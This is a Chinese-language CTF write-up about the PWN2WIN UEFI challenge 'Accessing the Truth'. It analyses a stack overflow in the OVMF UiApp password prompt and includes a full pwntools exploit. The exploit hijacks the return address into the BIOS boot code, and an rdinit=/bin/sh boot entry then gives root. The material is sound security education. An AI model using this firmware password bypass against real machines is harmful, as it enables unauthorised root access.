# 解决第一个UEFI PWN——Accessing the Truth解题思路

阅读量 **346131**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-06-25 14:30:56

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t013849d8c56b4c1752.png)

前段时间打了场PWN2WIN，期间遇到了这道BIOS题，正好来学习一下UEFI PWN

![](https://p5.ssl.qhimg.com/t010513ddaebff9c590.png)

题目包含下列文件

![](https://p4.ssl.qhimg.com/t014f92f3a23c8b9ebc.png)

## 题目分析

`run.py`是题目给的启动脚本

    
    
    #!/usr/bin/python3 -u
    import random
    import string
    import subprocess
    import tempfile
    
    def random_string(n):
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))
    
    def check_pow(bits):
        r = random_string(10)
        print(f"hashcash -mb{bits} {r}")
        solution = input("Solution: \n").strip()
        if subprocess.call(["hashcash", f"-cdb{bits}", "-r", r, solution],
                           cwd="/tmp",
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL) != 0:
            raise Exception("Invalid PoW")
    
    #check_pow(25)
    
    fname = tempfile.NamedTemporaryFile().name
    
    subprocess.call(["cp", "OVMF.fd", fname])
    try:
      subprocess.call(["chmod", "u+w", fname])
      subprocess.call(["qemu-system-x86_64",
                       "-monitor", "/dev/null",
                       "-m", "64M",
                       "-drive", "if=pflash,format=raw,file=" + fname, 
                       "-drive", "file=fat:rw:contents,format=raw",
                       "-net", "none",
                       "-nographic"], stderr=subprocess.DEVNULL, timeout=60)
    except:
      pass
    
    subprocess.call(["rm", "-rf", fname])
    print("Bye!")
    

注释掉pow，直接启动。启动起来是一个低权限用户的linux虚拟机，目标是获取根目录下flag.txt的内容，典型的内核题

![](https://p3.ssl.qhimg.com/t0157ef1d916817dca1.png)

仔细看启动命令，貌似没加载任何可疑的虚拟设备，排除掉QEMU逃逸

![](https://p2.ssl.qhimg.com/t01a956e4c1e969d346.png)

解开`contents/initramfs.cpio`，看到init文件。这里有一条`mount -t efivarfs efivarfs
/sys/firmware/efi/efivars`，怀疑是UEFI PWN

![](https://p3.ssl.qhimg.com/t01b05c1145ff360f7a.png)

另外，启动脚本里有60秒的timout，需要把这里干掉

![](https://p1.ssl.qhimg.com/t010a490623852c96a2.png)

## 解开OVMF

找到一个工具[UEFITool](https://github.com/LongSoft/UEFITool)能打开OVMF.fd，里面的文件貌似是PE32格式

![](https://p2.ssl.qhimg.com/t0128196929d403641b.png)

binwalk也能识别出来是PE，无奈还是解不开，继续找工具

![](https://p4.ssl.qhimg.com/t019b557de38e793f04.png)

发现这工具能解开：[UEFI Firmware Parser](https://github.com/theopolis/uefi-firmware-parser)

    
    
    uefi-firmware-parser -ecO ./OVMF.fd
    

解开后发现一堆pe raw文件

![](https://p1.ssl.qhimg.com/t01857762faa0758576.png)

## 定位到UiApp

既然是BIOS PWN，那就先进BIOS吧，启动时连按F12就进来了。

![](https://p3.ssl.qhimg.com/t0111aa488ca955c7f9.png)

进BIOS以后有一个密码校验，过了应该就能进BIOS。此外，还发现了以下一些信息

![](https://p5.ssl.qhimg.com/t01b4b37f7e32ef2920.png)

拿UEFITool能搜到些信息

![](https://p3.ssl.qhimg.com/t0174fb947d605bd881.png)

这里的id貌似能跟进BIOS的id对得上，这个应该是GUID

![](https://p1.ssl.qhimg.com/t0199da85541f67e9d7.png)

在解开的文件里搜`462CAA21-7614-4503-836E-8AB6F4662331`，找到了这个目录

![](https://p0.ssl.qhimg.com/t01bcafb90bea1f9e66.png)

IDA打开`section0.pe`，分析完以后这里选`Unicode`

![](https://p0.ssl.qhimg.com/t01e0d11a64fb23a084.png)

查找字符串，就能看到`Enter Password:`，可以确定`section0.pe`就是UiApp这个登录校验程序

![](https://p3.ssl.qhimg.com/t01936b53e89fed0921.png)

## 静态分析

校验程序有个sha256

![](https://p5.ssl.qhimg.com/t010270dcd55165e627.png)

漏洞点在：`\n`不会让while循环break掉，同时index不断自增1，`buf =
&input_buf[index];`获取到的栈地址继续往后延，这样可能会覆盖到返回地址

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      void *v3; // rsp
      void *v4; // rsp
      __int64 v5; // rdx
      __int64 v6; // r8
      __int64 v7; // r9
      size_t v8; // rdx
      __int64 v9; // r8
      __int64 v10; // r9
      char *buf; // rdx
      unsigned __int64 v12; // rax
      __int64 v13; // rdx
      __int64 v14; // r8
      __int64 v15; // r9
      char v17[7]; // [rsp+20h] [rbp-60h] BYREF
      char c; // [rsp+27h] [rbp-59h]
      char *input_buf; // [rsp+28h] [rbp-58h]
      __int64 v20; // [rsp+30h] [rbp-50h]
      char *v21; // [rsp+38h] [rbp-48h]
      __int64 v22; // [rsp+40h] [rbp-40h]
      size_t v23; // [rsp+48h] [rbp-38h]
      unsigned __int64 v24; // [rsp+50h] [rbp-30h]
      __int64 index; // [rsp+58h] [rbp-28h]
    
      v24 = 0i64;
      index = -1i64;
      v23 = 32i64;
      v22 = 31i64;
      v3 = alloca(32i64);
      v21 = v17;
      v20 = 31i64;
      v4 = alloca(32i64);
      input_buf = v17;
      wputs(word_1395A, 15i64, 32i64, 0i64);
      while ( v24 <= 2 )
      {
        sub_9D3(input_buf, v23, 0i64);
        index = -1i64;
        wputs(L"Enter Password: \n", v5, v6, v7);
        while ( 1 )
        {
          c = getchar();
          ++index;
          if ( c == '\r' )
            break;
          if ( c != '\n' )
          {
            buf = &input_buf[index];
            *buf = c;
            wputs(L"*", buf, v9, v10);
            v12 = wstr_length(input_buf);
            v8 = v23 - 1;
            if ( v12 >= v23 - 1 )
              break;
          }
        }
        wputs(L"\n", v8, v9, v10);
        sha256_process(input_buf, index, v21);
        if ( !((__int64 (__fastcall *)(char *, void *, size_t))memcmp)(v21, &unk_1B840, v23) )
          return 1;
        wputs(L"Wrong!!\n", v13, v14, v15);
        ++v24;
      }
      return 0;
    }
    

UiApp没开ASLR和NX，溢出后直接在栈执行shellcode即可

![](https://p0.ssl.qhimg.com/t01bdcb7322a47118f7.png)

## Debug

启动脚本

    
    
    from pwn import *
    
    context.arch = "amd64"
    context.log_level = "debug"
    
    tube.s = tube.send
    tube.sl = tube.sendline
    tube.sa = tube.sendafter
    tube.sla = tube.sendlineafter
    tube.r = tube.recv
    tube.ru = tube.recvuntil
    tube.rl = tube.recvline
    tube.ra = tube.recvall
    tube.rr = tube.recvregex
    tube.irt = tube.interactive
    
    DEBUG = 1
    
    if DEBUG == 0:
        fname = "/tmp/test_uefi"
        os.system("cp OVMF.fd %s" % (fname))
        os.system("chmod u+w %s" % (fname))
    
        p = process(["qemu-system-x86_64", "-m", "64M", "-drive", "if=pflash,format=raw,file="+fname, "-drive",
                        "file=fat:rw:contents,format=raw", "-net", "none", "-nographic"], env={})
    elif DEBUG == 1:
        fname = "/tmp/test_uefi"
        os.system("cp OVMF.fd %s" % (fname))
        os.system("chmod u+w %s" % (fname))
    
        p = process(["qemu-system-x86_64", "-s", "-m", "64M", "-drive", "if=pflash,format=raw,file="+fname, "-drive",
                        "file=fat:rw:contents,format=raw", "-net", "none", "-nographic"], env={})
    elif DEBUG == 2:
        p = remote('accessing-the-truth.pwn2win.party', 1337)
    
    def exploit():
        p.recvn(1)
        # sleep(1)
        p.send("\x1b[24~")
    
        p.irt()
    
    if __name__ == "__main__":
        exploit()
    

启动脚本加上`-s`参数，进BIOS以后gdb attach上

![](https://p0.ssl.qhimg.com/t01e6b75f1c0423c7f1.png)

问题就是怎么拿到UiApp的加载地址？尝试在gdb里搜这段数据

![](https://p0.ssl.qhimg.com/t015cee5d07e8b5ecf4.png)

找到三个地址，这里的`0x28ba990`比较可疑

![](https://p0.ssl.qhimg.com/t013efe5e63adaec969.png)

![](https://p5.ssl.qhimg.com/t01aa4c7a38cfed8fd5.png)

减去`Enter Password:`的offset，即`0x28ba990-0x13990 =
0x28a7000`，然后以`0x28a7000`为基址查看main函数的代码

![](https://p4.ssl.qhimg.com/t0134d57c70e53456a4.png)

可以断定`0x28a7000`就是UiApp的加载基址

![](https://p0.ssl.qhimg.com/t01fee5d6b45f5e4081.png)

用`0x28a7000`修正IDA分析的基址

![](https://p5.ssl.qhimg.com/t01bf3c46d1924f3148.png)

在IDA打上断点，给UiApp发以下数据

    
    
    def exploit():
        p.recvn(1)
        # sleep(1)
        p.send("\x1b[24~")
    
        #print(p.recvuntil("Password"))
    
        pause()
        p.sa('Password', 'A'*2+'\n'*2+'B'*0x18+'\r')
    
        p.irt()
    

由于`'\n'*2`，buf跳过了两个byte的地址，因而发送足够多`\n`便可溢出到返回地址

![](https://p2.ssl.qhimg.com/t01bb5e595003c27b04.png)

## Hijack to BIOS Booting

`&buf = 0x3EBC650`距离返回地址`0x3EBC6F0-0x3EBC650+8 = 0xa8`byte

![](https://p4.ssl.qhimg.com/t01790641dd7bb69336.png)

这样构造便能覆盖到返回地址

    
    
    payload = b'\n'*0xa8 + p32(0xdeadbeaf)
    payload += b'\r'
    

![](https://p4.ssl.qhimg.com/t015e69cc32e2f4c14c.png)

控了rip以后，需要将rip劫持到BIOS正常启动的代码，这片代码便是过了校验后启动BIOS程序

![](https://p5.ssl.qhimg.com/t01a09e44ff2e1e8b75.png)

对应的汇编代码，尝试劫持到`0x28B0DD5`

![](https://p3.ssl.qhimg.com/t013eb53e471b165069.png)

另外，发送`/r`会导致break while，只要令`v25>=3`即发送三次`\r`便能跳出外层while并return。

![](https://p1.ssl.qhimg.com/t01607823bd082ddc0b.png)

现在已经看到能启动到BIOS了

![](https://p5.ssl.qhimg.com/t016b4fd26d9a991990.png)

但pwntools连接的图形操作还有问题，可以用socat来连

    
    
    socat -,raw,echo=0 SYSTEM:"python ./solve.py"
    

![](https://p5.ssl.qhimg.com/t01f02ae4ae0b97ed23.png)

进入BIOS，增加一条启动项，启动内容加上`rdinit=/bin/sh`，保存后选该启动项来启动系统

![](https://p3.ssl.qhimg.com/t01d6951fc942b9d110.png)

启动进入到系统，现在已经是root权限

![](https://p3.ssl.qhimg.com/t01195f965bed6434e9.png)

打远程

![](https://p5.ssl.qhimg.com/t01382e521b90b85a32.png)

## Script

完整EXP

    
    
    #socat STDIO,icanon=0,echo=0 SYSTEM:"python ./solve.py"
    #socat -,raw,echo=0 SYSTEM:"python ./solve.py"
    
    from pwn import *
    
    context.arch = "amd64"
    #context.log_level = "debug"
    
    tube.s = tube.send
    tube.sl = tube.sendline
    tube.sa = tube.sendafter
    tube.sla = tube.sendlineafter
    tube.r = tube.recv
    tube.ru = tube.recvuntil
    tube.rl = tube.recvline
    tube.rn = tube.recvn
    tube.ra = tube.recvall
    tube.rr = tube.recvregex
    tube.irt = tube.interactive
    
    DEBUG = 1
    
    if DEBUG == 0:
        fname = "/tmp/test_uefi"
        os.system("cp OVMF.fd %s" % (fname))
        os.system("chmod u+w %s" % (fname))
    
        p = process(["qemu-system-x86_64", "-s", "-m", "64M", "-drive", "if=pflash,format=raw,file="+fname, "-drive",
                        "file=fat:rw:contents,format=raw", "-net", "none", "-nographic"], env={})
    elif DEBUG == 1:
        p = remote('accessing-the-truth.pwn2win.party', 1337)
    
    def pass_pow():
        p.ru('hashcash -mb25')
        hash = p.rl().strip()
    
        cmd = 'hashcash -mb25 '+hash.decode(encoding="utf-8")
        res = os.popen(cmd)
        cash = res.read()
        res.close()
    
        p.sa('Solution:', cash)
    
    def exploit():
        pass_pow()
    
        p.rn(1)
        p.s('\x1b[24~'*10)
    
        #pause()
        #p.sa('Password', 'A'*2+'\n'*2+'B'*0x18+'\r')
        #payload = 'A'*2+'\n'*2+'B'*0x18+'\r'
    
        #payload = b'\n'*0xa8 + p32(0xdeadbeaf)
        #payload += b'\r'
    
        payload = b'\n'*0xa8 + p32(0x28b0dd5)
        payload += b'\r'
    
        #pause()
        p.sa('Password', payload)
    
        payload = '\r'
        p.s(payload)
        p.s(payload)
    
        p.irt()
    
    
    if __name__ == "__main__":
        exploit()
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **sung3r** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/243007](/post/id/243007)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)
  * [BIOS](/tag/BIOS)

 **+1** __7赞

 __收藏

![](https://p3.ssl.qhimg.com/t0150f9fdc132075c49.png) sung3r

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

